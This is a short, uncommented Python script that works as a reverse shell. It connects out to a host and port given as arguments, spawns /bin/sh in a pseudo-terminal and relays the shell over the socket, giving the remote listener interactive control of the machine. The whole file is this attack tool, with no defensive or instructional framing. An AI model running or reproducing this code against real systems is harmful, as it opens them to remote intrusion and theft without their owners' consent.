#!/usr/bin/python3
# coding: utf8

import sys
import os
import socket

from ptyprocess import PtyProcessUnicode

from prompt_toolkit.input.vt100 import raw_mode
from utils import SelectableJointPool 

def main(host, port):

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    p = PtyProcessUnicode.spawn(["/bin/sh"], cwd="/tmp")
    
    with raw_mode(sys.stdin.fileno()):
        pool = SelectableJointPool()
        pool.join(p.fileno(), sock.fileno())
        pool.join(sock.fileno(), p.fileno())

        while True:
            try:
                pool.run()
            except:
                print("shutdown")
                break
            finally:
                if sock:
                    sock.close()
	
if __name__ == "__main__":
    host = sys.argv[1]
    port = int(sys.argv[2])

    main(host, port)
